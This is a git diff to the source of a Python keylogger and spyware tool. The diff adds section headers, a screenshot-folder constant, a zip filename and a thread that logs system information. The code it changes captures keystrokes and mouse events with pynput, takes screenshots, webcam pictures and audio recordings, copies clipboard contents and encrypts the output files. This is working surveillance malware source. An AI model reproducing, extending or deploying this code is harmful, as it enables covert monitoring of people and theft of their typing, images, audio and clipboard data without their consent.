@@ -1,4 +1,4 @@
-######################### IMPORT STATEMENTS #########################
+############################################################# IMPORT STATEMENTS #############################################################
 
 import logging
 import requests
@@ -16,6 +16,7 @@ import os
 import cv2
 import pathlib
 
+
 from pynput import keyboard, mouse
 from pynput.keyboard import Key
 from cryptography.fernet import Fernet
@@ -23,11 +24,15 @@ from PIL import ImageGrab
 
 
 
+############################################################# INITIALIZATION #############################################################
+
 # Constants
+SCREEN = 'Screenshots'
 WEBCAM= 'WebcamPics'
 LOG_FILE = "keylogfile.txt"
 CLIPBOARD = "clipboard.txt"
 WAVE_OUTPUT_FILENAME = "output.wav"
+ZIP = "test.zip"
 CHUNK = 4096
 FORMAT = pyaudio.paInt32
 CHANNELS = 2
@@ -39,6 +44,9 @@ audio = pyaudio.PyAudio()
 
 #Event to control Threads
 stop_thread = threading.Event()
+
+
+############################################################# RETRIEVE INFORMATION #############################################################
 
 #Setup logs files
 def setup_logging():
@@ -169,7 +177,7 @@ def clipboard():
 def screenshot():
     try:
         while not stop_thread.is_set():
-            pathlib.Path('Screenshots').mkdir(parents=True, exist_ok=True)
+            pathlib.Path(SCREEN).mkdir(parents=True, exist_ok=True)
             screen_path = 'Screenshots\\'
 
             for x in range(0,10):
@@ -181,6 +189,9 @@ def screenshot():
 
     except Exception as e:
         print("Screenshots could not be saved: " + str(e))
+
+
+############################################################# FILES CREATION #############################################################
 
 
 # Encrypt files
@@ -200,7 +211,6 @@ def encrypt(file_path):
     with open(file_path, 'wb') as encrypted_file:
         encrypted_file.write(encrypted)
 
-
 # Main function
 def main():
     try:
@@ -208,15 +218,20 @@ def main():
         log_system_info()
 
         # Start threads for clipboard, webcam, and audio recording
+
         t1 = threading.Thread(target=clipboard)
         t2 = threading.Thread(target=webcam)
         t3 = threading.Thread(target=Audio)
         t4 = threading.Thread(target=screenshot)
+        t5 = threading.Thread(target=log_system_info)
+
 
         t1.start()
         t2.start()
         t3.start()
         t4.start()
+        t5.start()
+
 
         # Start the keyboard and mouse listeners
         with keyboard.Listener(on_press=on_press, on_release=on_release) as key_listener, \
@@ -243,6 +258,7 @@ def main():
         t2.join()
         t3.join()
         t4.join()
+        t5.join()
 
 if __name__ == '__main__':
     try:
@@ -253,3 +269,6 @@ if __name__ == '__main__':
 
     except KeyboardInterrupt:
         print("Control-C entered... Program exiting")
+
+
+        
